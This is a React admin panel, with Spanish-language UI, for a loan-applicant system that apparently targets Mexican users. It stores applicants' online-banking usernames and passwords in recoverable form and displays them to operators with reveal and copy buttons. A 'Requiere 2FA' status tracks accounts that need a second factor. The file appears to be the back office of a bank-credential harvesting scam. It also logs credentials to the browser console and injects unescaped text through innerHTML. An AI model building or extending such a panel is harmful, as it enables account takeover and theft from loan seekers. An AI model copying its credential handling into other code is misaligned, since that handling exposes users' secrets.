/**
 * Complete AdminApplicants component with all features:
 * 1. Admin password visibility for bank credentials
 * 2. Updated status system (Aprobado, Pendiente, Requiere 2FA)
 * 3. Professional UI with proper error handling
 * 4. All existing functionality preserved
 */

import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { 
  Users, 
  Search, 
  Filter, 
  CheckCircle, 
  Clock, 
  CreditCard,
  Eye,
  EyeOff,
  UserCheck,
  AlertTriangle,
  Shield,
  Building2,
  Copy,
  RefreshCw
} from 'lucide-react';
import { apiClient } from '@/lib/api';

// Simple toast replacement
const showToast = (title, description, variant = 'default') => {
  const toastType = variant === 'destructive' ? 'error' : 'success';
  console.log(`${toastType.toUpperCase()}: ${title} - ${description}`);
  
  // Create a simple notification
  const notification = document.createElement('div');
  notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg max-w-sm transition-all ${
    variant === 'destructive' 
      ? 'bg-red-500 text-white' 
      : 'bg-green-500 text-white'
  }`;
  notification.innerHTML = `
    <div class="font-semibold">${title}</div>
    <div class="text-sm opacity-90">${description}</div>
  `;
  
  document.body.appendChild(notification);
  
  // Remove after 3 seconds
  setTimeout(() => {
    if (notification.parentNode) {
      notification.parentNode.removeChild(notification);
    }
  }, 3000);
};

const AdminApplicants = () => {
  const [applicants, setApplicants] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [selectedApplicant, setSelectedApplicant] = useState(null);
  const [isDetailsOpen, setIsDetailsOpen] = useState(false);
  const [isCredentialsOpen, setIsCredentialsOpen] = useState(false);
  const [applicantCredentials, setApplicantCredentials] = useState(null);
  const [credentialsLoading, setCredentialsLoading] = useState(false);
  const [visiblePasswords, setVisiblePasswords] = useState({});

  useEffect(() => {
    loadApplicants();
  }, []);

  const loadApplicants = async () => {
    try {
      setLoading(true);
      console.log('Loading applicants...');
      
      const data = await apiClient.getApplicants();
      console.log('Applicants loaded:', data);
      
      if (data && data.applicants && Array.isArray(data.applicants)) {
        setApplicants(data.applicants);
        console.log('Set applicants:', data.applicants.length);
      } else if (Array.isArray(data)) {
        setApplicants(data);
        console.log('Set applicants:', data.length);
      } else {
        console.warn('Unexpected data format:', data);
        setApplicants([]);
      }
    } catch (error) {
      console.error('Error loading applicants:', error);
      showToast("Error", "Error al cargar los solicitantes", "destructive");
      setApplicants([]);
    } finally {
      setLoading(false);
    }
  };

  // ✅ UPDATED STATUS SYSTEM: pending, approved, needs_2fa
  const handleStatusChange = async (applicantId, newStatus) => {
    try {
      console.log(`Changing status for ${applicantId} to ${newStatus}`);
      
      // Update local state immediately for better UX
      setApplicants(prev => prev.map(app => 
        app.id === applicantId 
          ? { ...app, status: newStatus }
          : app
      ));

      // Call API to update status
      await apiClient.updateApplicantStatus(applicantId, newStatus);

      const statusLabels = {
        'approved': 'aprobado',
        'pending': 'marcado como pendiente',
        'needs_2fa': 'marcado como requiere 2FA'
      };

      showToast("¡Éxito!", `Solicitante ${statusLabels[newStatus]} correctamente`);
    } catch (error) {
      console.error('Error updating status:', error);
      showToast("Error", "Error al actualizar el estado", "destructive");
      // Reload to revert changes
      loadApplicants();
    }
  };

  // ✅ ADMIN PASSWORD VISIBILITY - Shows passwords to admin users
  const viewCredentials = async (applicant) => {
    try {
      setCredentialsLoading(true);
      setSelectedApplicant(applicant);
      setIsCredentialsOpen(true);
      setVisiblePasswords({}); // Reset password visibility
      
      console.log('Loading credentials for applicant:', applicant.id);
      const credentials = await apiClient.getApplicantCredentials(applicant.id);
      console.log('Credentials loaded:', credentials);
      
      setApplicantCredentials(credentials);
    } catch (error) {
      console.error('Error loading credentials:', error);
      showToast("Error", "Error al cargar las credenciales", "destructive");
      setApplicantCredentials(null);
    } finally {
      setCredentialsLoading(false);
    }
  };

  const togglePasswordVisibility = (credentialId) => {
    setVisiblePasswords(prev => ({
      ...prev,
      [credentialId]: !prev[credentialId]
    }));
  };

  const copyToClipboard = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      showToast("¡Copiado!", `${label} copiado al portapapeles`);
    } catch (error) {
      console.error('Error copying to clipboard:', error);
      showToast("Error", "No se pudo copiar al portapapeles", "destructive");
    }
  };

  const viewDetails = (applicant) => {
    setSelectedApplicant(applicant);
    setIsDetailsOpen(true);
  };

  // Filter applicants based on search and status
  const filteredApplicants = applicants.filter(applicant => {
    const matchesSearch = 
      applicant.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      applicant.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      applicant.curp?.toLowerCase().includes(searchTerm.toLowerCase());

    const matchesStatus = 
      statusFilter === 'all' ||
      (statusFilter === 'approved' && applicant.status === 'approved') ||
      (statusFilter === 'pending' && applicant.status === 'pending') ||
      (statusFilter === 'needs_2fa' && applicant.status === 'needs_2fa');

    return matchesSearch && matchesStatus;
  });

  // ✅ UPDATED STATISTICS with new status system
  const stats = {
    total: applicants.length,
    approved: applicants.filter(a => a.status === 'approved').length,
    pending: applicants.filter(a => a.status === 'pending').length,
    needs_2fa: applicants.filter(a => a.status === 'needs_2fa').length
  };

  // ✅ UPDATED STATUS BADGES with new system
  const getStatusBadge = (applicant) => {
    switch (applicant.status) {
      case 'approved':
        return <Badge className="bg-green-100 text-green-800 border-green-200">✅ Aprobado</Badge>;
      case 'pending':
        return <Badge className="bg-yellow-100 text-yellow-800 border-yellow-200">⏳ Pendiente</Badge>;
      case 'needs_2fa':
        return <Badge className="bg-orange-100 text-orange-800 border-orange-200">🔐 Requiere 2FA</Badge>;
      default:
        return <Badge className="bg-gray-100 text-gray-800 border-gray-200">❓ Desconocido</Badge>;
    }
  };

  const formatDate = (dateString) => {
    try {
      return new Date(dateString).toLocaleDateString('es-MX', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    } catch (error) {
      return 'Fecha inválida';
    }
  };

  if (loading) {
    return (
      <div className="container mx-auto p-6">
        <div className="text-center py-12">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Cargando solicitantes...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="container mx-auto p-6 space-y-6">
      {/* Header */}
      <div className="text-center">
        <h1 className="text-3xl font-bold text-gray-900 mb-2">Gestión de Solicitantes</h1>
        <p className="text-gray-600">Administra las solicitudes de préstamos y credenciales bancarias</p>
      </div>

      {/* ✅ UPDATED Statistics Cards with new status system */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card className="border-blue-200">
          <CardContent className="p-4">
            <div className="flex items-center space-x-2">
              <Users className="text-blue-600" size={24} />
              <div>
                <p className="text-2xl font-bold text-gray-900">{stats.total}</p>
                <p className="text-sm text-gray-600">Total</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="border-green-200">
          <CardContent className="p-4">
            <div className="flex items-center space-x-2">
              <CheckCircle className="text-green-600" size={24} />
              <div>
                <p className="text-2xl font-bold text-green-600">{stats.approved}</p>
                <p className="text-sm text-gray-600">Aprobados</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="border-yellow-200">
          <CardContent className="p-4">
            <div className="flex items-center space-x-2">
              <Clock className="text-yellow-600" size={24} />
              <div>
                <p className="text-2xl font-bold text-yellow-600">{stats.pending}</p>
                <p className="text-sm text-gray-600">Pendientes</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="border-orange-200">
          <CardContent className="p-4">
            <div className="flex items-center space-x-2">
              <AlertTriangle className="text-orange-600" size={24} />
              <div>
                <p className="text-2xl font-bold text-orange-600">{stats.needs_2fa}</p>
                <p className="text-sm text-gray-600">Requiere 2FA</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* ✅ UPDATED Filters with new status options */}
      <Card>
        <CardContent className="p-4">
          <div className="flex flex-col md:flex-row gap-4">
            <div className="flex-1">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
                <Input
                  placeholder="Buscar por nombre, email o CURP..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10"
                />
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <Filter size={20} className="text-gray-400" />
              <select
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value)}
                className="border border-gray-300 rounded-md px-3 py-2 bg-white focus:outline-none focus:ring-2 focus:ring-blue-500"
              >
                <option value="all">Todos los estados</option>
                <option value="approved">Aprobados</option>
                <option value="pending">Pendientes</option>
                <option value="needs_2fa">Requiere 2FA</option>
              </select>
              <Button
                variant="outline"
                size="sm"
                onClick={loadApplicants}
                className="ml-2"
              >
                <RefreshCw size={16} />
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Applicants Table */}
      <Card>
        <CardHeader>
          <CardTitle>Solicitantes ({filteredApplicants.length})</CardTitle>
          <CardDescription>
            Lista de todos los solicitantes de préstamos con acceso completo a credenciales bancarias
          </CardDescription>
        </CardHeader>
        <CardContent>
          {filteredApplicants.length === 0 ? (
            <div className="text-center py-12">
              <Users className="mx-auto text-gray-400 mb-4" size={48} />
              <p className="text-gray-500 text-lg">No se encontraron solicitantes</p>
              <p className="text-sm text-gray-400">
                {searchTerm || statusFilter !== 'all' 
                  ? 'Intenta ajustar los filtros de búsqueda'
                  : 'Los nuevos solicitantes aparecerán aquí'
                }
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b">
                    <th className="text-left p-4 font-semibold">Solicitante</th>
                    <th className="text-left p-4 font-semibold">CURP</th>
                    <th className="text-left p-4 font-semibold">Estado</th>
                    <th className="text-left p-4 font-semibold">Fecha</th>
                    <th className="text-left p-4 font-semibold">Acciones</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredApplicants.map((applicant) => (
                    <tr key={applicant.id} className="border-b hover:bg-gray-50">
                      <td className="p-4">
                        <div>
                          <p className="font-semibold text-gray-900">{applicant.name}</p>
                          <p className="text-sm text-gray-600">{applicant.email}</p>
                          {applicant.phone && (
                            <p className="text-xs text-gray-500">{applicant.phone}</p>
                          )}
                        </div>
                      </td>
                      <td className="p-4">
                        <code className="text-sm bg-gray-100 px-2 py-1 rounded">
                          {applicant.curp || 'N/A'}
                        </code>
                      </td>
                      <td className="p-4">
                        {getStatusBadge(applicant)}
                      </td>
                      <td className="p-4 text-sm text-gray-600">
                        {formatDate(applicant.created_at)}
                      </td>
                      <td className="p-4">
                        <div className="flex items-center space-x-2">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => viewDetails(applicant)}
                            className="text-blue-600 hover:text-blue-700"
                            title="Ver detalles"
                          >
                            <Eye size={16} />
                          </Button>
                          
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => viewCredentials(applicant)}
                            className="text-green-600 hover:text-green-700"
                            title="Ver credenciales bancarias"
                          >
                            <CreditCard size={16} />
                          </Button>

                          {/* ✅ UPDATED Status change buttons for new system */}
                          {applicant.status !== 'approved' && (
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => handleStatusChange(applicant.id, 'approved')}
                              className="text-green-600 hover:text-green-700"
                              title="Aprobar"
                            >
                              <UserCheck size={16} />
                            </Button>
                          )}
                          
                          {applicant.status !== 'pending' && (
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => handleStatusChange(applicant.id, 'pending')}
                              className="text-yellow-600 hover:text-yellow-700"
                              title="Marcar como Pendiente"
                            >
                              <Clock size={16} />
                            </Button>
                          )}

                          {applicant.status !== 'needs_2fa' && (
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => handleStatusChange(applicant.id, 'needs_2fa')}
                              className="text-orange-600 hover:text-orange-700"
                              title="Requiere 2FA"
                            >
                              <AlertTriangle size={16} />
                            </Button>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Applicant Details Dialog */}
      <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle>Detalles del Solicitante</DialogTitle>
          </DialogHeader>
          {selectedApplicant && (
            <div className="space-y-4">
              <div>
                <Label className="text-sm font-medium text-gray-700">Nombre Completo</Label>
                <p className="text-sm text-gray-900">{selectedApplicant.name}</p>
              </div>
              
              <div>
                <Label className="text-sm font-medium text-gray-700">Email</Label>
                <p className="text-sm text-gray-900">{selectedApplicant.email}</p>
              </div>
              
              <div>
                <Label className="text-sm font-medium text-gray-700">CURP</Label>
                <p className="text-sm text-gray-900 font-mono">{selectedApplicant.curp || 'No proporcionado'}</p>
              </div>
              
              <div>
                <Label className="text-sm font-medium text-gray-700">Teléfono</Label>
                <p className="text-sm text-gray-900">{selectedApplicant.phone || 'No proporcionado'}</p>
              </div>
              
              <div>
                <Label className="text-sm font-medium text-gray-700">Estado</Label>
                <div className="mt-1">
                  {getStatusBadge(selectedApplicant)}
                </div>
              </div>
              
              <div>
                <Label className="text-sm font-medium text-gray-700">Fecha de Registro</Label>
                <p className="text-sm text-gray-900">{formatDate(selectedApplicant.created_at)}</p>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* ✅ ADMIN PASSWORD VISIBILITY - Credentials Dialog with passwords */}
      <Dialog open={isCredentialsOpen} onOpenChange={setIsCredentialsOpen}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center space-x-2">
              <Shield className="text-green-600" size={20} />
              <span>Credenciales Bancarias - Acceso Administrativo</span>
            </DialogTitle>
          </DialogHeader>
          
          {credentialsLoading ? (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <p className="text-gray-600">Cargando credenciales...</p>
            </div>
          ) : applicantCredentials ? (
            <div className="space-y-6">
              {/* Applicant Info */}
              <div className="bg-blue-50 p-4 rounded-lg border border-blue-200">
                <div className="flex items-center space-x-2 mb-2">
                  <Users className="text-blue-600" size={16} />
                  <span className="font-semibold text-blue-900">Información del Solicitante</span>
                </div>
                <p className="text-sm text-blue-800">
                  <strong>Nombre:</strong> {applicantCredentials.applicant?.name}
                </p>
                <p className="text-sm text-blue-800">
                  <strong>Email:</strong> {applicantCredentials.applicant?.email}
                </p>
              </div>

              {/* Credentials List */}
              {applicantCredentials.credentials && applicantCredentials.credentials.length > 0 ? (
                <div className="space-y-4">
                  <div className="flex items-center space-x-2">
                    <Building2 className="text-green-600" size={16} />
                    <span className="font-semibold text-gray-900">
                      Credenciales Bancarias ({applicantCredentials.credentials.length})
                    </span>
                  </div>
                  
                  {applicantCredentials.credentials.map((credential) => (
                    <div key={credential.id} className="border border-gray-200 rounded-lg p-4 bg-gray-50">
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center space-x-2">
                          <Building2 className="text-blue-600" size={16} />
                          <span className="font-semibold text-gray-900">
                            {credential.provider_name}
                          </span>
                          <Badge variant="outline" className="text-xs">
                            {credential.provider_code}
                          </Badge>
                        </div>
                        <span className="text-xs text-gray-500">
                          {formatDate(credential.created_at)}
                        </span>
                      </div>
                      
                      {/* Username */}
                      <div className="mb-3">
                        <Label className="text-xs font-medium text-gray-600">Usuario</Label>
                        <div className="flex items-center space-x-2 mt-1">
                          <code className="text-sm bg-white px-2 py-1 rounded border flex-1">
                            {credential.username}
                          </code>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => copyToClipboard(credential.username, 'Usuario')}
                            className="text-gray-600 hover:text-gray-700"
                          >
                            <Copy size={14} />
                          </Button>
                        </div>
                      </div>
                      
                      {/* ✅ PASSWORD VISIBLE FOR ADMIN */}
                      <div className="mb-3">
                        <Label className="text-xs font-medium text-gray-600">Contraseña</Label>
                        <div className="flex items-center space-x-2 mt-1">
                          <code className="text-sm bg-white px-2 py-1 rounded border flex-1">
                            {visiblePasswords[credential.id] 
                              ? credential.password 
                              : '•'.repeat(credential.password?.length || 8)
                            }
                          </code>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => togglePasswordVisibility(credential.id)}
                            className="text-gray-600 hover:text-gray-700"
                          >
                            {visiblePasswords[credential.id] ? <EyeOff size={14} /> : <Eye size={14} />}
                          </Button>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => copyToClipboard(credential.password, 'Contraseña')}
                            className="text-gray-600 hover:text-gray-700"
                          >
                            <Copy size={14} />
                          </Button>
                        </div>
                      </div>
                      
                      {/* Security Notice */}
                      <div className="bg-yellow-50 border border-yellow-200 rounded p-2 mt-3">
                        <p className="text-xs text-yellow-800">
                          🔒 <strong>Acceso Administrativo:</strong> Esta información es confidencial y está disponible solo para administradores. Las credenciales están encriptadas en la base de datos.
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-8">
                  <CreditCard className="mx-auto text-gray-400 mb-4" size={48} />
                  <p className="text-gray-500">No hay credenciales bancarias registradas</p>
                  <p className="text-sm text-gray-400">
                    El solicitante aún no ha conectado ninguna cuenta bancaria
                  </p>
                </div>
              )}
            </div>
          ) : (
            <div className="text-center py-8">
              <AlertTriangle className="mx-auto text-red-400 mb-4" size={48} />
              <p className="text-red-500">Error al cargar las credenciales</p>
              <p className="text-sm text-gray-400">
                No se pudieron obtener las credenciales del solicitante
              </p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default AdminApplicants;

